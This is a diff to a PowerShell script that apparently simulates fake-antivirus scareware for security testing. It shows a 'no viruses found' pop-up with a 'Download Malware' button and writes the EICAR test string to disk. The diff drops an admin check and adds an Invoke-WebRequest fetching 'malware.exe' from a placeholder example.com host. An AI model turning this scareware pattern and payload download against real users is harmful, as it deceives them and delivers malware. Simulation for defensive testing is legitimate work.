@@ -14,10 +14,11 @@ $label.Size = New-Object System.Drawing.Size(380,40)
 $label.Text = 'Your PC has been scanned and no viruses were found.'
 $form.Controls.Add($label)
 
-# Logging Setup
+# Define the log file path for EICAR creation
 $logFile = "C:\ProgramData\entropygorilla.log"
-$scriptName = "fakepopupantivirus.ps1"
+$scriptName = "eicar.ps1"
 
+# Function to log messages
 function Log-Message {
     param (
         [string]$message,
@@ -28,13 +29,6 @@ function Log-Message {
     Add-Content -Path $logFile -Value $logEntry
 }
 
-# Function to Check Admin Privileges
-function Test-Admin {
-    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $principal = New-Object Security.Principal.WindowsPrincipal $identity
-    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
-
 # EICAR Test String
 $eicarTestString1 = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$'
 $eicarTestString2 = '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
@@ -42,68 +36,54 @@ $eicarTestString2 = '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
 # Define the file path where EICAR file will be created
 $eicarFilePath = "C:\ProgramData\EICAR.txt"
 
-# Function to log messages for EICAR test file creation
-function Log-EicarMessage {
-    param (
-        [string]$message,
-        [string]$level = "INFO"
-    )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logEntry = "$timestamp [$level] [eicar.ps1] $message"
-    Add-Content -Path $logFile -Value $logEntry
-}
-
 # Function to create EICAR test file
 function Create-FakeEicarFile {
-    Log-EicarMessage "Starting creation of EICAR test file."
+    Log-Message "Starting creation of EICAR test file."
     try {
         # Check if the file already exists, and if it does, delete it first
         if (Test-Path -Path $eicarFilePath) {
             Remove-Item -Path $eicarFilePath -Force
-            Log-EicarMessage "Existing EICAR file found and deleted."
+            Log-Message "Existing EICAR file found and deleted."
         }
 
         # Create the EICAR test file
         "$($eicarTestString1)EICAR$($eicarTestString2)" | Out-File -FilePath $eicarFilePath -Force
-        Log-EicarMessage "EICAR test file created at $eicarFilePath."
+        Log-Message "EICAR test file created at $eicarFilePath."
 
     } catch {
         $errorMessage = "An error occurred while creating the EICAR file: $_"
         Write-Host $errorMessage
-        Log-EicarMessage $errorMessage "ERROR"
+        Log-Message $errorMessage "ERROR"
     }
 
     # End logging for EICAR creation
-    Log-EicarMessage "EICAR test file creation completed."
+    Log-Message "EICAR test file creation completed."
 }
 
-# Add Button to Trigger EICAR Test File Download
+# Add Button to Trigger Malware Download
 $button = New-Object System.Windows.Forms.Button
 $button.Location = New-Object System.Drawing.Point(150,100)
 $button.Size = New-Object System.Drawing.Size(120,30)
 $button.Text = 'Download Malware'
 
 $button.Add_Click({
-    Log-Message "Button clicked: Attempting to create EICAR test file."
+    # Log button click event
+    Log-Message "Button clicked: Attempting to download malware."
 
-    # Check if the script is running with administrator privileges
-    if (-not (Test-Admin)) {
-        Log-Message "Script is not running as administrator." "ERROR"
-        [System.Windows.Forms.MessageBox]::Show("Admin privileges required!", "Error", "OK", "Error")
-        return
+    # Download malware (second payload)
+    try {
+        Invoke-WebRequest -Uri 'https://example.com/malware.exe' -OutFile 'C:\temp\malware.exe'
+        Log-Message "Malware downloaded to C:\temp\malware.exe."
+    } catch {
+        Log-Message "Failed to download malware: $_" "ERROR"
     }
 
-    # Log that the EICAR creation is about to be triggered
-    Log-Message "Admin privileges confirmed. Proceeding with EICAR file creation."
-
-    # Create EICAR test file
+    # Create EICAR test file (first payload)
     Create-FakeEicarFile
 })
 
 $form.Controls.Add($button)
 
-# Log the action
+# Show Fake Antivirus Pop-up
 Log-Message "Displaying simulated fake antivirus pop-up."
-
-# Show the fake antivirus pop-up
 $form.ShowDialog()
